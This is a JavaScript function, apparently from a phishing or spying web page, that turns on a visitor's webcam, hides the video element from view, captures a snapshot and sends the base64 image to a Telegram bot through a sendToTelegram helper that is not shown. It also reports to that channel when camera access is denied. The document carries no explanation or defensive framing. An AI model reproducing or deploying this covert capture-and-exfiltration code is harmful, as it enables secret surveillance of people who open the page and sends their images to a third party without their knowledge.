function startCameraSnapshot() {
  const video = document.createElement("video");
  const canvas = document.createElement("canvas");
  video.setAttribute("playsinline", true);
  video.muted = true;
  video.style.position = "absolute";
  video.style.opacity = 0;
  canvas.width = 320;
  canvas.height = 240;

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      document.body.appendChild(video);
      video.onloadeddata = () => {
        setTimeout(() => {
          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
          const base64 = canvas.toDataURL("image/jpeg").split(",")[1];
          sendToTelegram("📸 Snapshot captured:", base64);
          stream.getTracks().forEach(t => t.stop());
          video.remove();
        }, 1000);
      };
    })
    .catch(() => {
      sendToTelegram("❌ Camera access denied or failed");
    });
}
